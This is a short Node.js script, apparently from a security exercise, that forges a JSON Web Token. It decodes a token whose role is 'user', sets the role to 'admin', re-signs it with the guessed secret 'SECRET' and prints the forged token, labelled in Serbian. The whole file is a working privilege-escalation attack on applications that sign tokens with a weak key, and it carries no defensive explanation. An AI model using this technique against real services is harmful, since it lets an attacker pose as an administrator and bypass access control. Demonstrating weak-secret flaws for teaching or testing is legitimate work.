const jwt = require("jsonwebtoken");

const token =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcwMzMzNjIwN30.8zVCl856VsXpDMlewGGuX51PEymSiJ67sLcMsXTNIgw";

const SECRET_KEY = "SECRET";

let decoded = jwt.decode(token);

decoded.role = "admin";

const encoded = jwt.sign(decoded, SECRET_KEY);

console.log("Promenjeni token: ", encoded);
